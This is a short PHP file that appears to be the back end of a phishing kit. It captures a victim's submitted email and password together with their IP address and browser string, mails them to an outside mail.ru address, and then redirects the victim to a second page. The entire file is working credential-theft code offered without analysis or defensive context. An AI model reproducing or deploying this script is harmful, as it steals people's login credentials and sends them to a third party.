<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Email ID *: ".$_POST['1']."\n";
$message .= "Password*: ".$_POST['2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$login = $_POST['1'];


$recipient = "david.lee.1972@mail.ru";
$sender = 'jn1111@126.com';
$headers .= "From: YHN 1<$sender>\n";
$subject = "YHN 1";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: index2.php?email=$login");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }